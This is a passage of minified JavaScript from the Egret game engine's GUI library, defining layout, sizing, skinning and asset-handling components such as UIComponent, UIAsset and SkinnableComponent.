			Object.defineProperty(a.prototype, "minHeight", {
				get : function () {
					return this._minHeight
				},
				set : function (b) {
					this._minHeight != b && (this._minHeight = b, this.invalidateSize())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "maxHeight", {
				get : function () {
					return this._maxHeight
				},
				set : function (b) {
					this._maxHeight != b && (this._maxHeight = b, this.invalidateSize())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "measuredWidth", {
				get : function () {
					return this._measuredWidth
				},
				set : function (b) {
					this._measuredWidth = b
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype,
				"measuredHeight", {
				get : function () {
					return this._measuredHeight
				},
				set : function (b) {
					this._measuredHeight = b
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.setActualSize = function (b, a) {
				var c = !1;
				this._width != b && (this._width = b, c = !0);
				this._height != a && (this._height = a, c = !0);
				c && (this.invalidateDisplayList(), this.dispatchResizeEvent())
			};
			Object.defineProperty(a.prototype, "x", {
				get : function () {
					return this._x
				},
				set : function (b) {
					this._x != b && (this._x = b, this.invalidateProperties(), this._includeInLayout && this.parent && this.parent instanceof
						a && this.parent._childXYChanged())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "y", {
				get : function () {
					return this._y
				},
				set : function (b) {
					this._y != b && (this._y = b, this.invalidateProperties(), this._includeInLayout && this.parent && this.parent instanceof a && this.parent._childXYChanged())
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.invalidateProperties = function () {
				this._invalidatePropertiesFlag || (this._invalidatePropertiesFlag = !0, this.parent && e.UIGlobals._layoutManager && e.UIGlobals._layoutManager.invalidateProperties(this))
			};
			a.prototype.validateProperties = function () {
				this._invalidatePropertiesFlag && (this.commitProperties(), this._invalidatePropertiesFlag = !1)
			};
			a.prototype.invalidateSize = function () {
				this._invalidateSizeFlag || (this._invalidateSizeFlag = !0, this.parent && e.UIGlobals._layoutManager && e.UIGlobals._layoutManager.invalidateSize(this))
			};
			a.prototype.validateSize = function (b) {
				"undefined" === typeof b && (b = !1);
				if (b)
					for (b = 0; b < this.numChildren; b++) {
						var a = this.getChildAt(b);
						"validateSize" in a && a.validateSize(!0)
					}
				this._invalidateSizeFlag &&
				(this.measureSizes() && (this.invalidateDisplayList(), this.invalidateParentSizeAndDisplayList()), this._invalidateSizeFlag = !1)
			};
			a.prototype.measureSizes = function () {
				var b = !1;
				if (!this._invalidateSizeFlag)
					return b;
				this.canSkipMeasurement() || (this.measure(), this.measuredWidth < this.minWidth && (this.measuredWidth = this.minWidth), this.measuredWidth > this.maxWidth && (this.measuredWidth = this.maxWidth), this.measuredHeight < this.minHeight && (this.measuredHeight = this.minHeight), this.measuredHeight > this.maxHeight && (this.measuredHeight =
							this.maxHeight));
				if (isNaN(this._oldPreferWidth))
					this._oldPreferWidth = this.preferredWidth, this._oldPreferHeight = this.preferredHeight, b = !0;
				else {
					if (this.preferredWidth != this._oldPreferWidth || this.preferredHeight != this._oldPreferHeight)
						b = !0;
					this._oldPreferWidth = this.preferredWidth;
					this._oldPreferHeight = this.preferredHeight
				}
				return b
			};
			a.prototype.invalidateDisplayList = function () {
				this._invalidateDisplayListFlag || (this._invalidateDisplayListFlag = !0, this.parent && e.UIGlobals._layoutManager && e.UIGlobals._layoutManager.invalidateDisplayList(this))
			};
			a.prototype.validateDisplayList = function () {
				if (this._invalidateDisplayListFlag) {
					var b = 0,
					a = 0,
					b = this._layoutWidthExplicitlySet ? this._width : isNaN(this.explicitWidth) ? this.measuredWidth : this._explicitWidth,
					a = this._layoutHeightExplicitlySet ? this._height : isNaN(this.explicitHeight) ? this.measuredHeight : this._explicitHeight;
					isNaN(b) && (b = 0);
					isNaN(a) && (a = 0);
					this.setActualSize(b, a);
					this.updateDisplayList(b, a);
					this._invalidateDisplayListFlag = !1
				}
			};
			a.prototype.validateNow = function (b) {
				"undefined" === typeof b && (b = !1);
				this._validateNowFlag || null == e.UIGlobals._layoutManager ? this._validateNowFlag = !0 : e.UIGlobals._layoutManager.validateClient(this, b)
			};
			a.prototype.invalidateParentSizeAndDisplayList = function () {
				if (this.parent && this._includeInLayout && "invalidateSize" in this.parent) {
					var b = this.parent;
					b.invalidateSize();
					b.invalidateDisplayList()
				}
			};
			a.prototype.updateDisplayList = function (b, a) {};
			a.prototype.canSkipMeasurement = function () {
				return !isNaN(this._explicitWidth) && !isNaN(this._explicitHeight)
			};
			a.prototype.commitProperties =
			function () {
				this.oldWidth == this._width && this.oldHeight == this._height || this.dispatchResizeEvent();
				this.oldX == this.x && this.oldY == this.y || this.dispatchMoveEvent()
			};
			a.prototype.measure = function () {
				this._measuredWidth = this._measuredHeight = 0
			};
			a.prototype.dispatchMoveEvent = function () {
				this.hasEventListener(e.MoveEvent.MOVE) && e.MoveEvent.dispatchMoveEvent(this, this.oldX, this.oldY);
				this.oldX = this.x;
				this.oldY = this.y
			};
			a.prototype._childXYChanged = function () {};
			a.prototype.dispatchResizeEvent = function () {
				this.hasEventListener(e.ResizeEvent.RESIZE) &&
				e.ResizeEvent.dispatchResizeEvent(this, this.oldWidth, this.oldHeight);
				this.oldWidth = this._width;
				this.oldHeight = this._height
			};
			Object.defineProperty(a.prototype, "includeInLayout", {
				get : function () {
					return this._includeInLayout
				},
				set : function (b) {
					this._includeInLayout != b && (this._includeInLayout = !0, this.invalidateParentSizeAndDisplayList(), this._includeInLayout = b)
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "left", {
				get : function () {
					return this._left
				},
				set : function (b) {
					this._left != b && (this._left =
							b, this.invalidateParentSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "right", {
				get : function () {
					return this._right
				},
				set : function (b) {
					this._right != b && (this._right = b, this.invalidateParentSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "top", {
				get : function () {
					return this._top
				},
				set : function (b) {
					this._top != b && (this._top = b, this.invalidateParentSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype,
				"bottom", {
				get : function () {
					return this._bottom
				},
				set : function (b) {
					this._bottom != b && (this._bottom = b, this.invalidateParentSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "horizontalCenter", {
				get : function () {
					return this._horizontalCenter
				},
				set : function (b) {
					this._horizontalCenter != b && (this._horizontalCenter = b, this.invalidateParentSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "verticalCenter", {
				get : function () {
					return this._verticalCenter
				},
				set : function (b) {
					this._verticalCenter != b && (this._verticalCenter = b, this.invalidateParentSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "percentWidth", {
				get : function () {
					return this._percentWidth
				},
				set : function (b) {
					this._percentWidth != b && (this._percentWidth = b, this.invalidateParentSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "percentHeight", {
				get : function () {
					return this._percentHeight
				},
				set : function (b) {
					this._percentHeight !=
					b && (this._percentHeight = b, this.invalidateParentSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.setLayoutBoundsSize = function (b, a) {
				isNaN(b) ? (this._layoutWidthExplicitlySet = !1, b = this.preferredWidth) : this._layoutWidthExplicitlySet = !0;
				isNaN(a) ? (this._layoutHeightExplicitlySet = !1, a = this.preferredHeight) : this._layoutHeightExplicitlySet = !0;
				this.setActualSize(b / this._scaleX, a / this._scaleY)
			};
			a.prototype.setLayoutBoundsPosition = function (b, a) {
				0 > this._scaleX && (b += this.layoutBoundsWidth);
				0 > this._scaleY &&
				(a += this.layoutBoundsHeight);
				var c = !1;
				this._x != b && (this._x = b, c = !0);
				this._y != a && (this._y = a, c = !0);
				c && this.dispatchMoveEvent()
			};
			Object.defineProperty(a.prototype, "preferredWidth", {
				get : function () {
					var b = this._hasWidthSet ? this._explicitWidth : this._measuredWidth,
					a = this._scaleX;
					0 > a && (a = -a);
					return b * a
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "preferredHeight", {
				get : function () {
					var b = this._hasHeightSet ? this._explicitHeight : this._measuredHeight,
					a = this._scaleY;
					0 > a && (a = -a);
					return b * a
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "preferredX", {
				get : function () {
					return 0 <= this._scaleX ? this._x : this._x - this.preferredWidth
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "preferredY", {
				get : function () {
					return 0 <= this._scaleY ? this._y : this._y - this.preferredHeight
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "layoutBoundsX", {
				get : function () {
					return 0 <= this._scaleX ? this._x : this._x - this.layoutBoundsWidth
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "layoutBoundsY", {
				get : function () {
					return 0 <= this._scaleY ? this._y : this._y - this.layoutBoundsHeight
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "layoutBoundsWidth", {
				get : function () {
					var b = 0,
					b = this._layoutWidthExplicitlySet ? this._width : this._hasWidthSet ? this._explicitWidth : this._measuredWidth,
					a = this._scaleX;
					0 > a && (a = -a);
					return b * a
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "layoutBoundsHeight", {
				get : function () {
					var b = 0,
					b = this._layoutHeightExplicitlySet ?
						this._height : this._hasHeightSet ? this._explicitHeight : this._measuredHeight,
					a = this.scaleY;
					0 > a && (a = -a);
					return b * a
				},
				enumerable : !0,
				configurable : !0
			});
			return a
		}
		(d.DisplayObjectContainer);
		e.UIComponent = f;
		f.prototype.__class__ = "egret.gui.UIComponent"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
(function (d) {
	(function (d) {
		var f = function () {
			function c() {}

			c.ABOVE = "above";
			c.BELOW = "below";
			c.CENTER = "center";
			c.TOP_LEFT = "topLeft";
			c.LEFT = "left";
			c.RIGHT = "right";
			return c
		}
		();
		d.PopUpPosition = f;
		f.prototype.__class__ = "egret.gui.PopUpPosition"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
(function (d) {
	(function (d) {
		var f = function () {
			function c() {}

			c.AUTO = "auto";
			c.OFF = "off";
			c.ON = "on";
			return c
		}
		();
		d.ScrollPolicy = f;
		f.prototype.__class__ = "egret.gui.ScrollPolicy"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a(b) {
				"undefined" === typeof b && (b = null);
				c.call(this);
				this.generator = b
			}
			__extends(a, c);
			a.prototype.newInstance = function () {
				return new this.generator
			};
			return a
		}
		(d.HashObject);
		e.ClassFactory = f;
		f.prototype.__class__ = "egret.gui.ClassFactory"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this)
			}
			__extends(a, c);
			a.prototype.initialize = function (b) {};
			a.prototype.apply = function (b) {};
			a.prototype.remove = function (b) {};
			a.prototype.initializeFromObject = function (b) {
				for (var a in b)
					this[a] = b[a];
				return this
			};
			return a
		}
		(d.HashObject);
		e.OverrideBase = f;
		f.prototype.__class__ = "egret.gui.OverrideBase"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (d) {
		var f = function (c) {
			function a(b, d, e, f) {
				c.call(this);
				this.propertyName = "";
				this.position = a.LAST;
				this.target = b;
				this.propertyName = d;
				this.position = e;
				this.relativeTo = f
			}
			__extends(a, c);
			a.prototype.initialize = function (b) {
				if ((b = b[this.target]) && !(b instanceof d.SkinnableComponent) && "_initialize" in b)
					try {
						b._initialize()
					} catch (a) {}

			};
			a.prototype.apply = function (b) {
				var c,
				d;
				try {
					d = b[this.relativeTo]
				} catch (e) {}

				var f = b[this.target];
				b = this.propertyName ? b[this.propertyName] : b;
				if (f && b) {
					switch (this.position) {
					case a.FIRST:
						c =
							0;
						break;
					case a.LAST:
						c = -1;
						break;
					case a.BEFORE:
						c = b.getElementIndex(d);
						break;
					case a.AFTER:
						c = b.getElementIndex(d) + 1
					}
					-1 == c && (c = b.numElements);
					b.addElementAt(f, c)
				}
			};
			a.prototype.remove = function (b) {
				var a = null == this.propertyName || "" == this.propertyName ? b : b[this.propertyName];
				(b = b[this.target]) && a && -1 != a.getElementIndex(b) && a.removeElement(b)
			};
			a.FIRST = "first";
			a.LAST = "last";
			a.BEFORE = "before";
			a.AFTER = "after";
			return a
		}
		(d.OverrideBase);
		d.AddItems = f;
		f.prototype.__class__ = "egret.gui.AddItems"
	})(d.gui || (d.gui = {}))
})(egret ||
	(egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (d) {
		var f = function (c) {
			function a(b, a, d) {
				c.call(this);
				this.target = b;
				this.name = a;
				this.value = d
			}
			__extends(a, c);
			a.prototype.apply = function (b) {
				b = null == this.target || "" == this.target ? b : b[this.target];
				null != b && (this.oldValue = b[this.name], this.setPropertyValue(b, this.name, this.value, this.oldValue))
			};
			a.prototype.remove = function (b) {
				b = null == this.target || "" == this.target ? b : b[this.target];
				null != b && (this.setPropertyValue(b, this.name, this.oldValue, this.oldValue), this.oldValue = null)
			};
			a.prototype.setPropertyValue =
			function (b, a, c, d) {
				b[a] = void 0 === c || null === c ? c : "boolean" == typeof d ? this.toBoolean(c) : c
			};
			a.prototype.toBoolean = function (b) {
				return "string" == typeof b ? "true" == b.toLowerCase() : !1 != b
			};
			return a
		}
		(d.OverrideBase);
		d.SetProperty = f;
		f.prototype.__class__ = "egret.gui.SetProperty"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a(b, a) {
				c.call(this);
				this.initialized = !1;
				this.name = b;
				this.overrides = a
			}
			__extends(a, c);
			a.prototype.initialize = function (b) {
				if (!this.initialized) {
					this.initialized = !0;
					for (var a = 0; a < this.overrides.length; a++)
						this.overrides[a].initialize(b)
				}
			};
			return a
		}
		(d.HashObject);
		e.State = f;
		f.prototype.__class__ = "egret.gui.State"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
(function (d) {
	(function (d) {
		var f = function () {
			function c() {}

			c.adjustRelativeByXY = function (a, b) {
				"undefined" === typeof b && (b = null);
				if (a && (b || (b = a.parent), b)) {
					var c = a.x,
					d = a.y,
					e = a.layoutBoundsHeight,
					f = a.layoutBoundsWidth,
					g = b.width,
					l = b.height;
					isNaN(a.left) || (a.left = c);
					isNaN(a.right) || (a.right = g - c - f);
					isNaN(a.horizontalCenter) || (a.horizontalCenter = c + 0.5 * f - 0.5 * g);
					isNaN(a.top) || (a.top = d);
					isNaN(a.bottom) || (a.bottom = l - d - e);
					isNaN(a.verticalCenter) || (a.verticalCenter = 0.5 * e - 0.5 * l + d)
				}
			};
			return c
		}
		();
		d.LayoutUtil = f;
		f.prototype.__class__ =
			"egret.gui.LayoutUtil"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
(function (d) {
	(function (e) {
		var f = {};
		e.getScale9Grid = function (c) {
			if (f[c])
				return f[c];
			if (!c)
				return null;
			var a = c.split(","),
			a = new d.Rectangle(parseInt(a[0]), parseInt(a[1]), parseInt(a[2]), parseInt(a[3]));
			return f[c] = a
		}
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a(b, a) {
				"undefined" === typeof a && (a = !0);
				c.call(this);
				this.fillMode = "scale";
				this.contentReused = this.createChildrenCalled = this.sourceChanged = !1;
				this.autoScale = !0;
				this.touchChildren = !1;
				b && (this.source = b);
				this.autoScale = a
			}
			__extends(a, c);
			Object.defineProperty(a.prototype, "source", {
				get : function () {
					return this._source
				},
				set : function (b) {
					this._source != b && (this._source = b, this.createChildrenCalled ? this.parseSource() : this.sourceChanged = !0)
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "content", {
				get : function () {
					return this._content
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.createChildren = function () {
				c.prototype.createChildren.call(this);
				this.sourceChanged && this.parseSource();
				this.createChildrenCalled = !0
			};
			a.prototype.parseSource = function () {
				this.sourceChanged = !1;
				var b = a.assetAdapter;
				b || (b = this.getAdapter());
				if (this._source) {
					var c = this.contentReused ? null : this._content;
					this.contentReused = !0;
					b.getAsset(this._source, this.contentChanged, this, c)
				} else
					this.contentChanged(null,
						null)
			};
			a.prototype.getAdapter = function () {
				var b;
				try {
					b = d.Injector.getInstance("egret.gui.IAssetAdapter")
				} catch (c) {
					b = new e.DefaultAssetAdapter
				}
				return a.assetAdapter = b
			};
			a.prototype.contentChanged = function (b, a) {
				if (a === this._source) {
					var c = this._content;
					this._content = b;
					c !== b && (c instanceof d.DisplayObject && this._removeFromDisplayList(c), b instanceof d.DisplayObject && this._addToDisplayListAt(b, 0));
					this.invalidateSize();
					this.invalidateDisplayList();
					this.contentReused = !1;
					this.hasEventListener(e.UIEvent.CONTENT_CHANGED) &&
					e.UIEvent.dispatchUIEvent(this, e.UIEvent.CONTENT_CHANGED)
				}
			};
			a.prototype.measure = function () {
				c.prototype.measure.call(this);
				var b = this._content;
				b instanceof d.DisplayObject ? "preferredWidth" in b ? (this.measuredWidth = b.preferredWidth, this.measuredHeight = b.preferredHeight) : (this.measuredWidth = b.width * b.scaleX, this.measuredHeight = b.height * b.scaleY) : b instanceof d.Texture && (this.measuredWidth = b._textureWidth, this.measuredHeight = b._textureHeight)
			};
			a.prototype.updateDisplayList = function (b, a) {
				c.prototype.updateDisplayList.call(this,
					b, a);
				var e = this._content;
				this.autoScale && e instanceof d.DisplayObject && ("setLayoutBoundsSize" in e ? e.setLayoutBoundsSize(b, a) : (e.width = b / e.scaleX, e.height = a / e.scaleY));
				this._setSizeDirty()
			};
			a.prototype._render = function (b) {
				if (this._content instanceof d.Texture) {
					var a = this._content;
					this._texture_to_render = a;
					var e;
					this.autoScale ? (e = this._width, a = this._height) : (e = a.textureWidth, a = a.textureHeight);
					d.Bitmap._drawBitmap(b, e, a, this)
				} else
					this._texture_to_render = null;
				c.prototype._render.call(this, b)
			};
			a.prototype._measureBounds =
			function () {
				var b = c.prototype._measureBounds.call(this);
				if (this._content instanceof d.Texture) {
					var a = this._content,
					e = this.width,
					f = this.height,
					h = Math.floor(a._offsetX * e / a._textureWidth),
					a = Math.floor(a._offsetY * f / a._textureHeight);
					h < b.x && (b.x = h);
					a < b.y && (b.y = a);
					h + e > b.right && (b.right = h + e);
					a + f > b.bottom && (b.bottom = a + f)
				}
				return b
			};
			a.prototype.addChild = function (b) {
				throw Error("addChild()" + a.errorStr + "addElement()\u4ee3\u66ff");
			};
			a.prototype.addChildAt = function (b, c) {
				throw Error("addChildAt()" + a.errorStr + "addElementAt()\u4ee3\u66ff");
			};
			a.prototype.removeChild = function (b) {
				throw Error("removeChild()" + a.errorStr + "removeElement()\u4ee3\u66ff");
			};
			a.prototype.removeChildAt = function (b) {
				throw Error("removeChildAt()" + a.errorStr + "removeElementAt()\u4ee3\u66ff");
			};
			a.prototype.setChildIndex = function (b, c) {
				throw Error("setChildIndex()" + a.errorStr + "setElementIndex()\u4ee3\u66ff");
			};
			a.prototype.swapChildren = function (b, c) {
				throw Error("swapChildren()" + a.errorStr + "swapElements()\u4ee3\u66ff");
			};
			a.prototype.swapChildrenAt = function (b, c) {
				throw Error("swapChildrenAt()" +
					a.errorStr + "swapElementsAt()\u4ee3\u66ff");
			};
			a.errorStr = "\u5728\u6b64\u7ec4\u4ef6\u4e2d\u4e0d\u53ef\u7528\uff0c\u82e5\u6b64\u7ec4\u4ef6\u4e3a\u5bb9\u5668\u7c7b\uff0c\u8bf7\u4f7f\u7528";
			return a
		}
		(e.UIComponent);
		e.UIAsset = f;
		f.prototype.__class__ = "egret.gui.UIAsset"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this.hostComponentKey = "egret.gui.SkinnableComponent";
				this.stateIsDirty = this.createChildrenCalled = this._skinNameExplicitlySet = !1;
				this.explicitMouseEnabled = this.explicitMouseChildren = this._autoMouseEnabled = !0
			}
			__extends(a, c);
			Object.defineProperty(a.prototype, "skinName", {
				get : function () {
					return this._skinName
				},
				set : function (b) {
					this._skinName != b && (this._skinName = b, this._skinNameExplicitlySet = !0, this.createChildrenCalled && this.parseSkinName())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "skin", {
				get : function () {
					return this._skin
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.createChildren = function () {
				c.prototype.createChildren.call(this);
				this.parseSkinName();
				this.createChildrenCalled = !0
			};
			a.prototype.parseSkinName = function () {
				var b = a.skinAdapter;
				b || (b = this.getSkinAdapter());
				var b = b.getSkin(this._skinName, this.hostComponentKey),
				c = this._skin;
				this.detachSkin(c);
				c instanceof d.DisplayObject && this._removeFromDisplayList(c);
				this._skin =
					b;
				b instanceof d.DisplayObject && this._addToDisplayListAt(this._skin, 0);
				this.attachSkin(b);
				this.invalidateSkinState();
				this.invalidateSize();
				this.invalidateDisplayList();
				this.hasEventListener(e.UIEvent.SKIN_CHANGED) && e.UIEvent.dispatchUIEvent(this, e.UIEvent.SKIN_CHANGED)
			};
			a.prototype.getSkinAdapter = function () {
				var b;
				try {
					b = d.Injector.getInstance("egret.gui.ISkinAdapter")
				} catch (c) {
					b = new e.DefaultSkinAdapter
				}
				return a.skinAdapter = b
			};
			a.prototype.attachSkin = function (b) {
				b && "hostComponent" in b && (b.hostComponent =
						this, this.findSkinParts());
				b && "hostComponent" in b && b instanceof d.DisplayObject ? this._setSkinLayoutEnabled(!1) : this._setSkinLayoutEnabled(!0)
			};
			a.prototype.findSkinParts = function () {
				var b = this._skin;
				if (b && "skinParts" in b)
					for (var a = b.skinParts, c = a.length, d = 0; d < c; d++) {
						var e = a[d];
						if (e in b)
							try {
								this[e] = b[e],
								this.partAdded(e, b[e])
							} catch (f) {}

					}
			};
			a.prototype.detachSkin = function (b) {
				if (b && "skinParts" in b) {
					for (var a = b.skinParts, c = a.length, d = 0; d < c; d++) {
						var e = a[d];
						e in this && (null != this[e] && this.partRemoved(e, this[e]),
							this[e] = null)
					}
					b.hostComponent = null
				}
			};
			a.prototype.partAdded = function (b, a) {
				e.SkinPartEvent.dispatchSkinPartEvent(this, e.SkinPartEvent.PART_ADDED, b, a)
			};
			a.prototype.partRemoved = function (b, a) {
				e.SkinPartEvent.dispatchSkinPartEvent(this, e.SkinPartEvent.PART_REMOVED, b, a)
			};
			a.prototype.invalidateSkinState = function () {
				this.stateIsDirty || (this.stateIsDirty = !0, this.invalidateProperties())
			};
			a.prototype.validateSkinState = function () {
				var b = this.getCurrentSkinState(),
				a = this._skin;
				a && "currentState" in a && (a.currentState =
						b);
				this.hasEventListener("stateChanged") && this.dispatchEventWith("stateChanged")
			};
			Object.defineProperty(a.prototype, "autoTouchEnabled", {
				get : function () {
					return this._autoMouseEnabled
				},
				set : function (b) {
					this._autoMouseEnabled != b && ((this._autoMouseEnabled = b) ? (this._touchChildren = this.enabled ? this.explicitMouseChildren : !1, this._touchEnabled = this.enabled ? this.explicitMouseEnabled : !1) : (this._touchChildren = this.explicitMouseChildren, this._touchEnabled = this.explicitMouseEnabled))
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "touchChildren", {
				get : function () {
					return this._touchChildren
				},
				set : function (b) {
					this.enabled && (this._touchChildren = b);
					this.explicitMouseChildren = b
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "touchEnabled", {
				get : function () {
					return this._touchEnabled
				},
				set : function (b) {
					this.enabled && (this._touchEnabled = b);
					this.explicitMouseEnabled = b
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "enabled", {
				get : function () {
					return this._enabled
				},
				set : function (b) {
					this._setEnabled(b)
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._setEnabled = function (b) {
				this._enabled != b && (this._enabled = b, this._autoMouseEnabled && (this._touchChildren = b ? this.explicitMouseChildren : !1, this._touchEnabled = b ? this.explicitMouseEnabled : !1), this.invalidateSkinState())
			};
			a.prototype.getCurrentSkinState = function () {
				return this.enabled ? "normal" : "disabled"
			};
			a.prototype.commitProperties = function () {
				c.prototype.commitProperties.call(this);
				this.stateIsDirty && (this.stateIsDirty = !1, this.validateSkinState())
			};
			a.prototype._setSkinLayoutEnabled =
			function (b) {
				null != this.skinLayout != b && (b ? (this.skinLayout = new e.SkinBasicLayout, this.skinLayout.target = this) : this.skinLayout = this.skinLayout.target = null, this.invalidateSize(), this.invalidateDisplayList())
			};
			a.prototype._childXYChanged = function () {
				this.skinLayout && (this.invalidateSize(), this.invalidateDisplayList())
			};
			a.prototype.measure = function () {
				c.prototype.measure.call(this);
				var b = this._skin;
				if (b) {
					var a = b instanceof d.DisplayObject;
					a && (b && "preferredWidth" in b ? (this.measuredWidth = b.preferredWidth,
							this.measuredHeight = b.preferredHeight) : (this.measuredWidth = b.width, this.measuredHeight = b.height));
					this.skinLayout && this.skinLayout.measure();
					if (!a) {
						var a = this.measuredWidth,
						e = this.measuredHeight;
						try {
							isNaN(b.width) || (a = Math.ceil(b.width)),
							isNaN(b.height) || (e = Math.ceil(b.height)),
							b.hasOwnProperty("minWidth") && a < b.minWidth && (a = b.minWidth),
							b.hasOwnProperty("maxWidth") && a > b.maxWidth && (a = b.maxWidth),
							b.hasOwnProperty("minHeight") && e < b.minHeight && (e = b.minHeight),
							b.hasOwnProperty("maxHeight") && e > b.maxHeight &&
							(e = b.maxHeight),
							this.measuredWidth = a,
							this.measuredHeight = e
						} catch (f) {}

					}
				}
			};
			a.prototype.updateDisplayList = function (b, a) {
				c.prototype.updateDisplayList.call(this, b, a);
				var e = this._skin;
				e && ("setLayoutBoundsSize" in e ? e.setLayoutBoundsSize(b, a) : e instanceof d.DisplayObject && (e.scaleX = 0 == e.width ? 1 : b / e.width, e.scaleY = 0 == e.height ? 1 : a / e.height));
				this.skinLayout && this.skinLayout.updateDisplayList(b, a)
			};
			a.prototype.addChild = function (b) {
				throw Error("addChild()" + a.errorStr + "addElement()\u4ee3\u66ff");
			};
			a.prototype.addChildAt =
			function (b, c) {
				throw Error("addChildAt()" + a.errorStr + "addElementAt()\u4ee3\u66ff");
			};
			a.prototype.removeChild = function (b) {
				throw Error("removeChild()" + a.errorStr + "removeElement()\u4ee3\u66ff");
			};
			a.prototype.removeChildAt = function (b) {
				throw Error("removeChildAt()" + a.errorStr + "removeElementAt()\u4ee3\u66ff");
			};
			a.prototype.setChildIndex = function (b, c) {
				throw Error("setChildIndex()" + a.errorStr + "setElementIndex()\u4ee3\u66ff");
			};
			a.prototype.swapChildren = function (b, c) {
				throw Error("swapChildren()" + a.errorStr +
					"swapElements()\u4ee3\u66ff");
			};
			a.prototype.swapChildrenAt = function (b, c) {
				throw Error("swapChildrenAt()" + a.errorStr + "swapElementsAt()\u4ee3\u66ff");
			};
			a.errorStr = "\u5728\u6b64\u7ec4\u4ef6\u4e2d\u4e0d\u53ef\u7528\uff0c\u82e5\u6b64\u7ec4\u4ef6\u4e3a\u5bb9\u5668\u7c7b\uff0c\u8bf7\u4f7f\u7528";
			return a
		}
		(e.UIComponent);
		e.SkinnableComponent = f;
		f.prototype.__class__ = "egret.gui.SkinnableComponent"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
(function (d) {
	(function (e) {
		var f = function () {
			function c() {}

			c.prototype.getSkin = function (a, b) {
				if (!a)
					return null;
				if (a.prototype)
					return new a;
				if ("string" == typeof a) {
					var c = d.getDefinitionByName(a);
					return c ? new c : null
				}
				return a
			};
			return c
		}
		();
		e.DefaultSkinAdapter = f;
		f.prototype.__class__ = "egret.gui.DefaultSkinAdapter"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
(function (d) {
	(function (e) {
		var f = function () {
			function c() {}

			c.prototype.getAsset = function (a, b, c, e) {
				var f = a;
				a.prototype && (f = new a);
				if (f instanceof d.DisplayObject || f instanceof d.Texture)
					b.call(c, f, a);
